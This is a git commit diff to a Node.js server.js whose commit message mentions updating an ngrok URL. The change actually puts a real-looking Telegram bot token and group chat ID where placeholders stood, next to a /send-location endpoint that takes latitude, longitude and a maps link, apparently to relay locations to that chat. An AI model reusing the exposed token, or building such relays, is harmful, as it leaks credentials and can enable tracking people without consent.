7f5b9f56c8ac46e6992b14ed89f677eea26f9bc3
Wnasty <w.nasty777@gmail.com>
2025-04-06 09:13:14 -0300

    Atualiza URL do ngrok

--- server.js
+++ server.js
@@ -8,8 +8,8 @@ const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-const TELEGRAM_BOT_TOKEN = "BOT-TOKEN"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "CHAT-TOKEN"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+const TELEGRAM_BOT_TOKEN = "7773110554:AAGyiusGd1iLW7i3C_xagxH9ZhGElpCJNXQ"; // Substitua pelo token do seu bot
+const TELEGRAM_CHAT_ID = "-4609999057"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
 
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps } = req.body;
